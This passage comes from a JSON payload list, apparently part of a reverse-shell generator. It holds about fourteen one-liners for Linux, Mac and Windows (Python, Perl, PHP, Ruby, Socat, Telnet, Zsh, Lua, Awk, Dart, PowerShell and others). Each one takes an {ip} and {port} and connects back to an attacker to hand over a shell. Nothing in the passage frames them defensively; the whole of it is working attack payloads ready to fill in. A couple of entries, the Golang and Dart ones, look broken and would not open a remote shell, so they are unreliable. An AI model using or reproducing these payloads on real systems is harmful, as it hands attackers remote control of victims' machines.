      { "name": "Python", "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
      { "name": "Python3", "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
      { "name": "Perl", "payload": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'", "desc": "Linux", "tags": ["linux"] },
      { "name": "PHP", "payload": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh <&3 >&3 2>&3\");'", "desc": "Linux", "tags": ["linux"] },
      { "name": "Ruby", "payload": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
      { "name": "Socat", "payload": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}", "desc": "Linux", "tags": ["linux"] },
      { "name": "Telnet", "payload": "rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p", "desc": "Linux", "tags": ["linux"] },
      { "name": "Zsh", "payload": "zsh -c 'zmodload -i zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0<&$REPLY'", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
      { "name": "Lua", "payload": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3')\"", "desc": "Linux", "tags": ["linux"] },
      { "name": "Golang", "payload": "echo 'package main;import \"os/exec\";func main(){exec.Command(\"/bin/sh\",\"-i\").Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go", "desc": "Linux", "tags": ["linux"] },
      { "name": "Awk", "payload": "awk 'BEGIN{s=\"/inet/tcp/0/{ip}/{port}\";while(1){do{printf \"$ \"|&s;s|&getline c;if(c){while((c|&s)>0)print $0|&s;close(c)}}while(c!=\"exit\")}}'", "desc": "Linux", "tags": ["linux"] },
      { "name": "Dart", "payload": "import 'dart:io';import 'dart:convert';main(){Socket.connect('{ip}',{port}).then((s){s.cast<List<int>>().transform(Utf8Encoder()).pipe(s);stdin.pipe(s);});}", "desc": "跨平台", "tags": ["linux", "mac", "windows"] }
    ],
    "Windows": [
      { "name": "PowerShell", "payload": "$c=New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\"PS \"+(pwd).Path+\"> \";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()", "desc": "Windows PowerShell", "tags": ["windows"] },
      { "name": "PowerShell TLS", "payload": "$c=New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$s=$c.GetStream();$ssl=New-Object System.Net.Security.SslStream($s,$false);[void]$ssl.AuthenticateAsClient(\"{ip}\");$sb=New-Object System.Text.StringBuilder;while($true){$sb.Clear();[byte[]]$b=0..65535|%{0};$t=$ssl.Read($b,0,$b.Length);$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$t);$r=(iex $d 2>&1|Out-String);$r2=$r+\"PS \"+(pwd).Path+\"> \";$ssl.Write([text.encoding]::ASCII.GetBytes($r2),0,$r2.Length);$ssl.Flush()};$c.Close()", "desc": "Windows PowerShell TLS", "tags": ["windows"] }
    ],
